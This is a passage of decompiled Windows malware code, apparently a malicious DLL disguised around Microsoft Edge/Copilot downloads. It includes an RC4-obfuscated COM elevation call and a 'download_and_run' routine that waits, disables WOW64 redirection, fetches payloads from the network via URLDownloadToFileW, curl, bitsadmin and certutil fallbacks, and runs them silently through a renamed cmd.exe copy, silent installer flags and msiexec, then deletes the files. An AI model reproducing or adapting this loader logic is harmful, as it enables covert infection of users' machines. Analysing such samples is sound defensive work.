               "https://bat.bing.com/action/0?ti=355008692&Ver=2&mid=9dd000fc-3f1d-4f25-b754-56c568867a53&bo=3&sid=7dd7c360cadb11f19c791b81049a4d8e&vid=7dd7a930cadb11f199a8696811f7d60a&vids=0&msclkid=N&uach=pv%3D10.0.0&pi=2009958101&lg=zh-CN&sw=2560&sh=1440&sc=24&tl=%E4%B8%8B%E8%BD%BD%20Microsoft%20Edge%20%7C%20Windows%E3%80%81Mac%20%26%20Linux&p=https%3A%2F%2Fexplore.microsoft.com%2Fzh-cn%2Fedge%2Fdownload%3Fch%3D1%26form%3DMA13FJ&r=&lt=433&evt=pageLoad&sv=2&asc=G&cdb=AQAQ&rn=610609"
              );
  CoInitialize((LPVOID)0x0);
  local_18 = -0x7fffbffb;
  local_14 = (int *)0x0;
  local_88c = 0;
  _memset(local_88a,0,0x7fe);
  SHGetFolderPathW(0,0x24,0);
  _memset(&stack0xffffef76,0,0x7fe);
  FID_conflict__swprintf
            ((wchar_t *)&stack0xffffef74,(wchar_t *)0x400,L"%s\\explorer.exe",&local_88c);
  iVar1 = FUN_100194b0((undefined1 (*) [16])&stack0xffffef74);
  if (iVar1 != 0) {
    basic_string<>(local_74,
                   L"989F94151F1737E0819CF3CBD3F90C6F721C4DDC68DE4A4FD4D1012AD5EC14CB6BE6DF4D224F73362DDD35D8BD539B23B6A985199365C1D36C9D76932C86AB325274"
                  );
    local_8 = 0;
    basic_string<>(local_8c,L"3DC0C2FE338F567442B73E4B644B4F1A");
    local_8._0_1_ = 1;
    rc4_decrypt_hex(local_5c,local_74,local_8c);
    local_8._0_1_ = 3;
    FUN_1000a650(local_8c);
    local_44.grfFlags = 0;
    local_44.grfMode = 0;
    local_44.dwTickCountDeadline = 0;
    local_34 = 0;
    local_2c = 0;
    local_28 = 0;
    local_24 = 0;
    local_44.cbStruct = 0x24;
    local_30 = 4;
    ppv = &local_14;
    riid = &pBindOptions_10196e90;
    pBindOptions = &local_44;
    pszName = (LPCWSTR)FUN_1000c3a0(local_5c);
    local_18 = CoGetObject(pszName,pBindOptions,(IID *)riid,ppv);
    if (local_18 < 0) {
      local_20 = 0;
      local_8 = (uint)local_8._1_3_ << 8;
      FUN_1000a650(local_5c);
      local_8 = 0xffffffff;
      FUN_1000a650(local_74);
      ExceptionList = local_10;
      return local_20;
    }
    local_18 = (**(code **)(*local_14 + 0x24))(local_14,param_1,0,0,0,5);
    local_8 = (uint)local_8._1_3_ << 8;
    FUN_1000a650(local_5c);
    local_8 = 0xffffffff;
    FUN_1000a650(local_74);
  }
  CoUninitialize();
  if (local_14 != (int *)0x0) {
    (**(code **)(*local_14 + 8))(local_14);
  }
  local_1c = (uint)(-1 < local_18);
  ExceptionList = local_10;
  return local_1c;
}

// ===== download_and_run @ 0x100140d6: URLDownloadToFileW / curl / bitsadmin / certutil fallbacks, 60 s retry window =====
undefined4 download_and_run(void)

{
  HMODULE pHVar1;
  FARPROC pFVar2;
  DWORD DVar3;
  BOOL BVar4;
  LPWSTR pWVar5;
  void *pvVar6;
  LPCWSTR pWVar7;
  HRESULT HVar8;
  int iVar9;
  int unaff_EBP;
  LPSECURITY_ATTRIBUTES p_Var10;
  LPSECURITY_ATTRIBUTES p_Var11;
  LPVOID pvVar12;
  LPCWSTR pWVar13;
  LPSTARTUPINFOW p_Var14;
  LPBINDSTATUSCALLBACK pIVar15;
  LPPROCESS_INFORMATION p_Var16;
  
  Sleep(60000);
  *(undefined4 *)(unaff_EBP + -0xb0) = 0;
  *(undefined2 *)(unaff_EBP + -0x108) = 0x6b;
  *(undefined2 *)(unaff_EBP + -0x106) = 0x65;
  *(undefined2 *)(unaff_EBP + -0x104) = 0x72;
  *(undefined2 *)(unaff_EBP + -0x102) = 0x6e;
  *(undefined2 *)(unaff_EBP + -0x100) = 0x65;
  *(undefined2 *)(unaff_EBP + -0xfe) = 0x6c;
  *(undefined2 *)(unaff_EBP + -0xfc) = 0x33;
  *(undefined2 *)(unaff_EBP + -0xfa) = 0x32;
  *(undefined2 *)(unaff_EBP + -0xf8) = 0x2e;
  *(undefined2 *)(unaff_EBP + -0xf6) = 100;
  *(undefined2 *)(unaff_EBP + -0xf4) = 0x6c;
  *(undefined2 *)(unaff_EBP + -0xf2) = 0x6c;
  *(undefined2 *)(unaff_EBP + -0xf0) = 0;
  *(undefined1 *)(unaff_EBP + -0x94) = 0x57;
  *(undefined1 *)(unaff_EBP + -0x93) = 0x6f;
  *(undefined1 *)(unaff_EBP + -0x92) = 0x77;
  *(undefined1 *)(unaff_EBP + -0x91) = 0x36;
  *(undefined1 *)(unaff_EBP + -0x90) = 0x34;
  *(undefined1 *)(unaff_EBP + -0x8f) = 0x44;
  *(undefined1 *)(unaff_EBP + -0x8e) = 0x69;
  *(undefined1 *)(unaff_EBP + -0x8d) = 0x73;
  *(undefined1 *)(unaff_EBP + -0x8c) = 0x61;
  *(undefined1 *)(unaff_EBP + -0x8b) = 0x62;
  *(undefined1 *)(unaff_EBP + -0x8a) = 0x6c;
  *(undefined1 *)(unaff_EBP + -0x89) = 0x65;
  *(undefined1 *)(unaff_EBP + -0x88) = 0x57;
  *(undefined1 *)(unaff_EBP + -0x87) = 0x6f;
  *(undefined1 *)(unaff_EBP + -0x86) = 0x77;
  *(undefined1 *)(unaff_EBP + -0x85) = 0x36;
  *(undefined1 *)(unaff_EBP + -0x84) = 0x34;
  *(undefined1 *)(unaff_EBP + -0x83) = 0x46;
  *(undefined1 *)(unaff_EBP + -0x82) = 0x73;
  *(undefined1 *)(unaff_EBP + -0x81) = 0x52;
  *(undefined1 *)(unaff_EBP + -0x80) = 0x65;
  *(undefined1 *)(unaff_EBP + -0x7f) = 100;
  *(undefined1 *)(unaff_EBP + -0x7e) = 0x69;
  *(undefined1 *)(unaff_EBP + -0x7d) = 0x72;
  *(undefined1 *)(unaff_EBP + -0x7c) = 0x65;
  *(undefined1 *)(unaff_EBP + -0x7b) = 99;
  *(undefined1 *)(unaff_EBP + -0x7a) = 0x74;
  *(undefined1 *)(unaff_EBP + -0x79) = 0x69;
  *(undefined1 *)(unaff_EBP + -0x78) = 0x6f;
  *(undefined1 *)(unaff_EBP + -0x77) = 0x6e;
  *(undefined1 *)(unaff_EBP + -0x76) = 0;
  *(undefined1 *)(unaff_EBP + -0x74) = 0x57;
  *(undefined1 *)(unaff_EBP + -0x73) = 0x6f;
  *(undefined1 *)(unaff_EBP + -0x72) = 0x77;
  *(undefined1 *)(unaff_EBP + -0x71) = 0x36;
  *(undefined1 *)(unaff_EBP + -0x70) = 0x34;
  *(undefined1 *)(unaff_EBP + -0x6f) = 0x52;
  *(undefined1 *)(unaff_EBP + -0x6e) = 0x65;
  *(undefined1 *)(unaff_EBP + -0x6d) = 0x76;
  *(undefined1 *)(unaff_EBP + -0x6c) = 0x65;
  *(undefined1 *)(unaff_EBP + -0x6b) = 0x72;
  *(undefined1 *)(unaff_EBP + -0x6a) = 0x74;
  *(undefined1 *)(unaff_EBP + -0x69) = 0x57;
  *(undefined1 *)(unaff_EBP + -0x68) = 0x6f;
  *(undefined1 *)(unaff_EBP + -0x67) = 0x77;
  *(undefined1 *)(unaff_EBP + -0x66) = 0x36;
  *(undefined1 *)(unaff_EBP + -0x65) = 0x34;
  *(undefined1 *)(unaff_EBP + -100) = 0x46;
  *(undefined1 *)(unaff_EBP + -99) = 0x73;
  *(undefined1 *)(unaff_EBP + -0x62) = 0x52;
  *(undefined1 *)(unaff_EBP + -0x61) = 0x65;
  *(undefined1 *)(unaff_EBP + -0x60) = 100;
  *(undefined1 *)(unaff_EBP + -0x5f) = 0x69;
  *(undefined1 *)(unaff_EBP + -0x5e) = 0x72;
  *(undefined1 *)(unaff_EBP + -0x5d) = 0x65;
  *(undefined1 *)(unaff_EBP + -0x5c) = 99;
  *(undefined1 *)(unaff_EBP + -0x5b) = 0x74;
  *(undefined1 *)(unaff_EBP + -0x5a) = 0x69;
  *(undefined1 *)(unaff_EBP + -0x59) = 0x6f;
  *(undefined1 *)(unaff_EBP + -0x58) = 0x6e;
  *(undefined1 *)(unaff_EBP + -0x57) = 0;
  pHVar1 = GetModuleHandleW((LPCWSTR)(unaff_EBP + -0x108));
  *(HMODULE *)(unaff_EBP + -0x50) = pHVar1;
  if (*(int *)(unaff_EBP + -0x50) == 0) {
    *(undefined4 *)(unaff_EBP + -200) = 0;
  }
  else {
    pFVar2 = GetProcAddress(*(HMODULE *)(unaff_EBP + -0x50),(LPCSTR)(unaff_EBP + -0x94));
    *(FARPROC *)(unaff_EBP + -200) = pFVar2;
  }
  *(undefined4 *)(unaff_EBP + -0xe8) = *(undefined4 *)(unaff_EBP + -200);
  if (*(int *)(unaff_EBP + -0x50) == 0) {
    *(undefined4 *)(unaff_EBP + -0xe4) = 0;
  }
  else {
    pFVar2 = GetProcAddress(*(HMODULE *)(unaff_EBP + -0x50),(LPCSTR)(unaff_EBP + -0x74));
    *(FARPROC *)(unaff_EBP + -0xe4) = pFVar2;
  }
  *(undefined4 *)(unaff_EBP + -0xe0) = *(undefined4 *)(unaff_EBP + -0xe4);
  if (*(int *)(unaff_EBP + -0xe8) != 0) {
    (**(code **)(unaff_EBP + -0xe8))(unaff_EBP + -0xb0);
  }
  _memset((void *)(unaff_EBP + -0x1cc),0,0x44);
  *(undefined4 *)(unaff_EBP + -0x1cc) = 0x44;
  *(undefined4 *)(unaff_EBP + -0x2c) = 0;
  *(undefined4 *)(unaff_EBP + -0x28) = 0;
  *(undefined4 *)(unaff_EBP + -0x24) = 0;
  *(undefined4 *)(unaff_EBP + -0x20) = 0;
  *(undefined4 *)(unaff_EBP + -0x1a0) = 1;
  *(undefined2 *)(unaff_EBP + -0x19c) = 0;
  *(undefined4 *)(unaff_EBP + -0x40) = 0;
  *(undefined4 *)(unaff_EBP + -0x54) = 0;
  do {
    if ((3 < *(int *)(unaff_EBP + -0x54)) || (*(int *)(unaff_EBP + -0x40) != 0)) {
      if ((*(int *)(unaff_EBP + -0xe0) != 0) && (*(int *)(unaff_EBP + -0xb0) != 0)) {
        (**(code **)(unaff_EBP + -0xe0))(*(undefined4 *)(unaff_EBP + -0xb0));
      }
      *(undefined4 *)(unaff_EBP + -0x174) = *(undefined4 *)(unaff_EBP + -0x40);
      *(undefined1 *)(unaff_EBP + -4) = 0;
      FUN_1000a630((int *)(unaff_EBP + -0x18));
      *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
      FUN_1000a630((int *)(unaff_EBP + -0x44));
      ExceptionList = *(void **)(unaff_EBP + -0xc);
      return *(undefined4 *)(unaff_EBP + -0x174);
    }
    if (0 < *(int *)(unaff_EBP + -0x54)) {
      DVar3 = GetTickCount();
      *(DWORD *)(unaff_EBP + -0x11c) = DVar3;
      while (DVar3 = GetTickCount(), DVar3 - *(int *)(unaff_EBP + -0x11c) < 60000) {
        while (BVar4 = PeekMessageW((LPMSG)(unaff_EBP + -0x1e8),(HWND)0x0,0,0,1), BVar4 != 0) {
          TranslateMessage((MSG *)(unaff_EBP + -0x1e8));
          DispatchMessageW((MSG *)(unaff_EBP + -0x1e8));
        }
        Sleep(0x32);
      }
    }
    if (*(int *)(unaff_EBP + -0xb8) == 0) {
      if (*(int *)(unaff_EBP + -0xbc) == 0) {
        if (*(int *)(unaff_EBP + -0xcc) != 0) {
          CStringT<>((void *)(unaff_EBP + -0x48));
          *(undefined1 *)(unaff_EBP + -4) = 0xd;
          GetTickCount();
          FUN_1000adc0((void *)(unaff_EBP + -0x48),L"%s%u.bat");
          pIVar15 = (LPBINDSTATUSCALLBACK)0x0;
          DVar3 = 0;
          pWVar13 = (LPCWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x48));
          pWVar7 = (LPCWSTR)std::error_condition::value(*(error_condition **)(unaff_EBP + 8));
          HVar8 = URLDownloadToFileW((LPUNKNOWN)0x0,pWVar7,pWVar13,DVar3,pIVar15);
          *(HRESULT *)(unaff_EBP + -0x168) = HVar8;
          if (*(int *)(unaff_EBP + -0x168) < 0) {
            DVar3 = GetLastError();
            *(DWORD *)(unaff_EBP + -0x188) = DVar3;
          }
          else {
            CStringT<>((void *)(unaff_EBP + -0x4c));
            *(undefined1 *)(unaff_EBP + -4) = 0xe;
            FUN_1000adc0((void *)(unaff_EBP + -0x4c),L"%s\\cmd.exe /c \"%s\"");
            p_Var16 = (LPPROCESS_INFORMATION)(unaff_EBP + -0x2c);
            p_Var14 = (LPSTARTUPINFOW)(unaff_EBP + -0x1cc);
            pWVar13 = (LPCWSTR)0x0;
            pvVar12 = (LPVOID)0x0;
            DVar3 = 0x8000000;
            BVar4 = 0;
            p_Var11 = (LPSECURITY_ATTRIBUTES)0x0;
            p_Var10 = (LPSECURITY_ATTRIBUTES)0x0;
            pWVar5 = (LPWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x4c));
            BVar4 = CreateProcessW((LPCWSTR)0x0,pWVar5,p_Var10,p_Var11,BVar4,DVar3,pvVar12,pWVar13,
                                   p_Var14,p_Var16);
            *(BOOL *)(unaff_EBP + -0xac) = BVar4;
            if (*(int *)(unaff_EBP + -0xac) == 0) {
              *(undefined1 *)(unaff_EBP + -0xb2) = 0;
              *(undefined2 *)(unaff_EBP + -0x800) = 0;
              _memset((void *)(unaff_EBP + -0x7fe),0,0x206);
              GetTempPathW(0x104,(LPWSTR)(unaff_EBP + -0x800));
              *(undefined2 *)(unaff_EBP + -0xa08) = 0;
              _memset((void *)(unaff_EBP + -0xa06),0,0x206);
              iVar9 = std::error_condition::value((error_condition *)(unaff_EBP + -0x18));
              FID_conflict__swprintf
                        ((wchar_t *)(unaff_EBP + -0xa08),(wchar_t *)0x104,L"%s\\cmd.exe",iVar9);
              *(undefined2 *)(unaff_EBP + -0x3f0) = 0;
              _memset((void *)(unaff_EBP + -0x3ee),0,0x206);
              pvVar6 = FUN_100131b0((void *)(unaff_EBP + -0x170),6);
              *(void **)(unaff_EBP + -0x16c) = pvVar6;
              iVar9 = std::error_condition::value(*(error_condition **)(unaff_EBP + -0x16c));
              FID_conflict__swprintf
                        ((wchar_t *)(unaff_EBP + -0x3f0),(wchar_t *)0x104,L"%s%s.exe",
                         unaff_EBP + -0x800,iVar9);
              FUN_1000a630((int *)(unaff_EBP + -0x170));
              BVar4 = CopyFileW((LPCWSTR)(unaff_EBP + -0xa08),(LPCWSTR)(unaff_EBP + -0x3f0),0);
              if (BVar4 == 1) {
                FUN_1000adc0((void *)(unaff_EBP + -0x4c),L"\"%s\" /c \"%s\"");
                p_Var16 = (LPPROCESS_INFORMATION)(unaff_EBP + -0x2c);
                p_Var14 = (LPSTARTUPINFOW)(unaff_EBP + -0x1cc);
                pWVar13 = (LPCWSTR)0x0;
                pvVar12 = (LPVOID)0x0;
                DVar3 = 0x8000000;
                BVar4 = 0;
                p_Var11 = (LPSECURITY_ATTRIBUTES)0x0;
                p_Var10 = (LPSECURITY_ATTRIBUTES)0x0;
                pWVar5 = (LPWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x4c))
                ;
                BVar4 = CreateProcessW((LPCWSTR)0x0,pWVar5,p_Var10,p_Var11,BVar4,DVar3,pvVar12,
                                       pWVar13,p_Var14,p_Var16);
                *(BOOL *)(unaff_EBP + -0xac) = BVar4;
                if (*(int *)(unaff_EBP + -0xac) != 0) {
                  DVar3 = WaitForSingleObject(*(HANDLE *)(unaff_EBP + -0x2c),60000);
                  *(DWORD *)(unaff_EBP + -0xec) = DVar3;
                  if (*(int *)(unaff_EBP + -0xec) == 0) {
                    *(undefined4 *)(unaff_EBP + -0xd8) = 0;
                    BVar4 = GetExitCodeProcess(*(HANDLE *)(unaff_EBP + -0x2c),
                                               (LPDWORD)(unaff_EBP + -0xd8));
                    if ((BVar4 != 0) && (*(int *)(unaff_EBP + -0xd8) == 0)) {
                      *(undefined4 *)(unaff_EBP + -0x40) = 1;
                    }
                  }
                  else if (*(int *)(unaff_EBP + -0xec) == 0x102) {
                    TerminateProcess(*(HANDLE *)(unaff_EBP + -0x2c),0);
                  }
                  CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
                  CloseHandle(*(HANDLE *)(unaff_EBP + -0x28));
                }
                DeleteFileW((LPCWSTR)(unaff_EBP + -0x3f0));
              }
            }
            else {
              DVar3 = WaitForSingleObject(*(HANDLE *)(unaff_EBP + -0x2c),60000);
              *(DWORD *)(unaff_EBP + -0xd4) = DVar3;
              if (*(int *)(unaff_EBP + -0xd4) == 0) {
                *(undefined4 *)(unaff_EBP + -0xd0) = 0;
                BVar4 = GetExitCodeProcess(*(HANDLE *)(unaff_EBP + -0x2c),
                                           (LPDWORD)(unaff_EBP + -0xd0));
                if ((BVar4 != 0) && (*(int *)(unaff_EBP + -0xd0) == 0)) {
                  *(undefined4 *)(unaff_EBP + -0x40) = 1;
                }
              }
              else if (*(int *)(unaff_EBP + -0xd4) == 0x102) {
                TerminateProcess(*(HANDLE *)(unaff_EBP + -0x2c),0);
              }
              CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
              CloseHandle(*(HANDLE *)(unaff_EBP + -0x28));
            }
            pWVar13 = (LPCWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x48));
            DeleteFileW(pWVar13);
            *(undefined1 *)(unaff_EBP + -4) = 0xd;
            FUN_1000a630((int *)(unaff_EBP + -0x4c));
          }
          *(undefined1 *)(unaff_EBP + -4) = 1;
          FUN_1000a630((int *)(unaff_EBP + -0x48));
        }
      }
      else {
        *(undefined1 *)(unaff_EBP + -0xb1) = 0;
        CStringT<>((void *)(unaff_EBP + -0x1c));
        *(undefined1 *)(unaff_EBP + -4) = 5;
        pvVar6 = FUN_1000fdd0((void *)(unaff_EBP + -0x14c),2);
        *(void **)(unaff_EBP + -0x120) = pvVar6;
        *(undefined4 *)(unaff_EBP + -0x124) = *(undefined4 *)(unaff_EBP + -0x120);
        *(undefined1 *)(unaff_EBP + -4) = 6;
        pvVar6 = FUN_1000fdd0((void *)(unaff_EBP + -0x148),4);
        *(void **)(unaff_EBP + -0x128) = pvVar6;
        *(undefined4 *)(unaff_EBP + -300) = *(undefined4 *)(unaff_EBP + -0x128);
        *(undefined1 *)(unaff_EBP + -4) = 7;
        pvVar6 = FUN_1000fdd0((void *)(unaff_EBP + -0x144),2);
        *(void **)(unaff_EBP + -0x130) = pvVar6;
        *(undefined4 *)(unaff_EBP + -0x134) = *(undefined4 *)(unaff_EBP + -0x130);
        *(undefined1 *)(unaff_EBP + -4) = 8;
        pvVar6 = FUN_1000fdd0((void *)(unaff_EBP + -0x140),4);
        *(void **)(unaff_EBP + -0x138) = pvVar6;
        *(undefined4 *)(unaff_EBP + -0x13c) = *(undefined4 *)(unaff_EBP + -0x138);
        *(undefined1 *)(unaff_EBP + -4) = 9;
        FUN_1000adc0((void *)(unaff_EBP + -0x1c),
                     L"%scopilot_overlay_X64_153.0.%s.%s_154.0.%s.%s.exe");
        *(undefined1 *)(unaff_EBP + -4) = 8;
        FUN_1000a630((int *)(unaff_EBP + -0x140));
        *(undefined1 *)(unaff_EBP + -4) = 7;
        FUN_1000a630((int *)(unaff_EBP + -0x144));
        *(undefined1 *)(unaff_EBP + -4) = 6;
        FUN_1000a630((int *)(unaff_EBP + -0x148));
        *(undefined1 *)(unaff_EBP + -4) = 5;
        FUN_1000a630((int *)(unaff_EBP + -0x14c));
        *(undefined4 *)(unaff_EBP + -0x38) = 0;
        CStringT<>((void *)(unaff_EBP + -0x3c));
        *(undefined1 *)(unaff_EBP + -4) = 10;
        if (*(int *)(unaff_EBP + -0x38) == 0) {
          pvVar6 = ATL__operator_((void *)(unaff_EBP + -0x178),(CStringT<> *)(unaff_EBP + -0x18),
                                  L"\\curl.exe");
          *(void **)(unaff_EBP + -0x150) = pvVar6;
          *(uint *)(unaff_EBP + -0x14) = *(uint *)(unaff_EBP + -0x14) | 1;
          pWVar13 = (LPCWSTR)std::error_condition::value(*(error_condition **)(unaff_EBP + -0x150));
          BVar4 = PathFileExistsW(pWVar13);
          if (BVar4 == 0) goto LAB_100146b9;
          *(undefined4 *)(unaff_EBP + -0xc0) = 1;
        }
        else {
LAB_100146b9:
          *(undefined4 *)(unaff_EBP + -0xc0) = 0;
        }
        *(undefined1 *)(unaff_EBP + -0x30) = *(undefined1 *)(unaff_EBP + -0xc0);
        if ((*(uint *)(unaff_EBP + -0x14) & 1) != 0) {
          *(uint *)(unaff_EBP + -0x14) = *(uint *)(unaff_EBP + -0x14) & 0xfffffffe;
          FUN_1000a630((int *)(unaff_EBP + -0x178));
        }
        if (*(char *)(unaff_EBP + -0x30) != '\0') {
          CStringT<>((void *)(unaff_EBP + -0xa4));
          *(undefined1 *)(unaff_EBP + -4) = 0xb;
          FUN_1000adc0((void *)(unaff_EBP + -0xa4),L"-L -s -o");
          FUN_1000adc0((void *)(unaff_EBP + -0x3c),L"\"%s\\curl.exe\" %s \"%s\" \"%s\"");
          p_Var16 = (LPPROCESS_INFORMATION)(unaff_EBP + -0x2c);
          p_Var14 = (LPSTARTUPINFOW)(unaff_EBP + -0x1cc);
          pWVar13 = (LPCWSTR)0x0;
          pvVar12 = (LPVOID)0x0;
          DVar3 = 0;
          BVar4 = 0;
          p_Var11 = (LPSECURITY_ATTRIBUTES)0x0;
          p_Var10 = (LPSECURITY_ATTRIBUTES)0x0;
          pWVar5 = (LPWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x3c));
          BVar4 = CreateProcessW((LPCWSTR)0x0,pWVar5,p_Var10,p_Var11,BVar4,DVar3,pvVar12,pWVar13,
                                 p_Var14,p_Var16);
          if (BVar4 != 0) {
            WaitForSingleObject(*(HANDLE *)(unaff_EBP + -0x2c),0xffffffff);
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x28));
            pWVar13 = (LPCWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x1c));
            BVar4 = PathFileExistsW(pWVar13);
            if (BVar4 != 0) {
              *(undefined4 *)(unaff_EBP + -0x38) = 1;
            }
          }
          *(undefined1 *)(unaff_EBP + -4) = 10;
          FUN_1000a630((int *)(unaff_EBP + -0xa4));
        }
        if (*(int *)(unaff_EBP + -0x38) == 0) {
          pvVar6 = ATL__operator_((void *)(unaff_EBP + -0x15c),(CStringT<> *)(unaff_EBP + -0x18),
                                  L"\\bitsadmin.exe");
          *(void **)(unaff_EBP + -0x158) = pvVar6;
          *(uint *)(unaff_EBP + -0x14) = *(uint *)(unaff_EBP + -0x14) | 2;
          pWVar13 = (LPCWSTR)std::error_condition::value(*(error_condition **)(unaff_EBP + -0x158));
          BVar4 = PathFileExistsW(pWVar13);
          if (BVar4 == 0) goto LAB_100147fc;
          *(undefined4 *)(unaff_EBP + -0xc4) = 1;
        }
        else {
LAB_100147fc:
          *(undefined4 *)(unaff_EBP + -0xc4) = 0;
        }
        *(undefined1 *)(unaff_EBP + -0x32) = *(undefined1 *)(unaff_EBP + -0xc4);
        if ((*(uint *)(unaff_EBP + -0x14) & 2) != 0) {
          *(uint *)(unaff_EBP + -0x14) = *(uint *)(unaff_EBP + -0x14) & 0xfffffffd;
          FUN_1000a630((int *)(unaff_EBP + -0x15c));
        }
        if (*(char *)(unaff_EBP + -0x32) != '\0') {
          GetTickCount();
          FUN_1000adc0((void *)(unaff_EBP + -0x3c),
                       L"\"%s\\bitsadmin.exe\" /transfer myJob_%u /download /priority foreground \"%s\" \"%s\""
                      );
          p_Var16 = (LPPROCESS_INFORMATION)(unaff_EBP + -0x2c);
          p_Var14 = (LPSTARTUPINFOW)(unaff_EBP + -0x1cc);
          pWVar13 = (LPCWSTR)0x0;
          pvVar12 = (LPVOID)0x0;
          DVar3 = 0;
          BVar4 = 0;
          p_Var11 = (LPSECURITY_ATTRIBUTES)0x0;
          p_Var10 = (LPSECURITY_ATTRIBUTES)0x0;
          pWVar5 = (LPWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x3c));
          BVar4 = CreateProcessW((LPCWSTR)0x0,pWVar5,p_Var10,p_Var11,BVar4,DVar3,pvVar12,pWVar13,
                                 p_Var14,p_Var16);
          if (BVar4 != 0) {
            WaitForSingleObject(*(HANDLE *)(unaff_EBP + -0x2c),0xffffffff);
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x28));
            pWVar13 = (LPCWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x1c));
            BVar4 = PathFileExistsW(pWVar13);
            if (BVar4 != 0) {
              *(undefined4 *)(unaff_EBP + -0x38) = 1;
            }
          }
        }
        if (*(int *)(unaff_EBP + -0x38) == 0) {
          pvVar6 = ATL__operator_((void *)(unaff_EBP + -0x164),(CStringT<> *)(unaff_EBP + -0x18),
                                  L"\\certutil.exe");
          *(void **)(unaff_EBP + -0x160) = pvVar6;
          *(uint *)(unaff_EBP + -0x14) = *(uint *)(unaff_EBP + -0x14) | 4;
          pWVar13 = (LPCWSTR)std::error_condition::value(*(error_condition **)(unaff_EBP + -0x160));
          BVar4 = PathFileExistsW(pWVar13);
          if (BVar4 == 0) goto LAB_1001490d;
          *(undefined4 *)(unaff_EBP + -0xdc) = 1;
        }
        else {
LAB_1001490d:
          *(undefined4 *)(unaff_EBP + -0xdc) = 0;
        }
        *(undefined1 *)(unaff_EBP + -0x31) = *(undefined1 *)(unaff_EBP + -0xdc);
        if ((*(uint *)(unaff_EBP + -0x14) & 4) != 0) {
          *(uint *)(unaff_EBP + -0x14) = *(uint *)(unaff_EBP + -0x14) & 0xfffffffb;
          FUN_1000a630((int *)(unaff_EBP + -0x164));
        }
        if (*(char *)(unaff_EBP + -0x31) != '\0') {
          FUN_1000adc0((void *)(unaff_EBP + -0x3c),
                       L"\"%s\\certutil.exe\" -urlcache -split -f \"%s\" \"%s\"");
          p_Var16 = (LPPROCESS_INFORMATION)(unaff_EBP + -0x2c);
          p_Var14 = (LPSTARTUPINFOW)(unaff_EBP + -0x1cc);
          pWVar13 = (LPCWSTR)0x0;
          pvVar12 = (LPVOID)0x0;
          DVar3 = 0;
          BVar4 = 0;
          p_Var11 = (LPSECURITY_ATTRIBUTES)0x0;
          p_Var10 = (LPSECURITY_ATTRIBUTES)0x0;
          pWVar5 = (LPWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x3c));
          BVar4 = CreateProcessW((LPCWSTR)0x0,pWVar5,p_Var10,p_Var11,BVar4,DVar3,pvVar12,pWVar13,
                                 p_Var14,p_Var16);
          if (BVar4 != 0) {
            WaitForSingleObject(*(HANDLE *)(unaff_EBP + -0x2c),0xffffffff);
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x28));
            pWVar13 = (LPCWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x1c));
            BVar4 = PathFileExistsW(pWVar13);
            if (BVar4 != 0) {
              *(undefined4 *)(unaff_EBP + -0x38) = 1;
            }
          }
        }
        if (*(int *)(unaff_EBP + -0x38) != 0) {
          CStringT<>((void *)(unaff_EBP + -0xa8));
          *(undefined1 *)(unaff_EBP + -4) = 0xc;
          FUN_1000adc0((void *)(unaff_EBP + -0xa8),L"\"%s\" /S /norestart");
          p_Var16 = (LPPROCESS_INFORMATION)(unaff_EBP + -0x2c);
          p_Var14 = (LPSTARTUPINFOW)(unaff_EBP + -0x1cc);
          pWVar13 = (LPCWSTR)0x0;
          pvVar12 = (LPVOID)0x0;
          DVar3 = 8;
          BVar4 = 0;
          p_Var11 = (LPSECURITY_ATTRIBUTES)0x0;
          p_Var10 = (LPSECURITY_ATTRIBUTES)0x0;
          pWVar5 = (LPWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0xa8));
          BVar4 = CreateProcessW((LPCWSTR)0x0,pWVar5,p_Var10,p_Var11,BVar4,DVar3,pvVar12,pWVar13,
                                 p_Var14,p_Var16);
          if (BVar4 != 0) {
            WaitForSingleObject(*(HANDLE *)(unaff_EBP + -0x2c),0xffffffff);
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
            CloseHandle(*(HANDLE *)(unaff_EBP + -0x28));
            *(undefined4 *)(unaff_EBP + -0x40) = 1;
          }
          pWVar13 = (LPCWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x1c));
          DeleteFileW(pWVar13);
          *(undefined1 *)(unaff_EBP + -4) = 10;
          FUN_1000a630((int *)(unaff_EBP + -0xa8));
        }
        *(undefined1 *)(unaff_EBP + -4) = 5;
        FUN_1000a630((int *)(unaff_EBP + -0x3c));
        *(undefined1 *)(unaff_EBP + -4) = 1;
        FUN_1000a630((int *)(unaff_EBP + -0x1c));
      }
    }
    else {
      CStringT<>((void *)(unaff_EBP + -0xa0));
      *(undefined1 *)(unaff_EBP + -4) = 2;
      FUN_1000adc0((void *)(unaff_EBP + -0xa0),L"msiexec.exe");
      CStringT<>((void *)(unaff_EBP + -0x9c));
      *(undefined1 *)(unaff_EBP + -4) = 3;
      FUN_1000adc0((void *)(unaff_EBP + -0x9c),L"/qn /norestart");
      CStringT<>((void *)(unaff_EBP + -0x98));
      *(undefined1 *)(unaff_EBP + -4) = 4;
      FUN_1000adc0((void *)(unaff_EBP + -0x98),L"\"%s\\%s\" /i \"%s\" %s");
      p_Var16 = (LPPROCESS_INFORMATION)(unaff_EBP + -0x2c);
      p_Var14 = (LPSTARTUPINFOW)(unaff_EBP + -0x1cc);
      pWVar13 = (LPCWSTR)0x0;
      pvVar12 = (LPVOID)0x0;
      DVar3 = 0;
      BVar4 = 0;
      p_Var11 = (LPSECURITY_ATTRIBUTES)0x0;
      p_Var10 = (LPSECURITY_ATTRIBUTES)0x0;
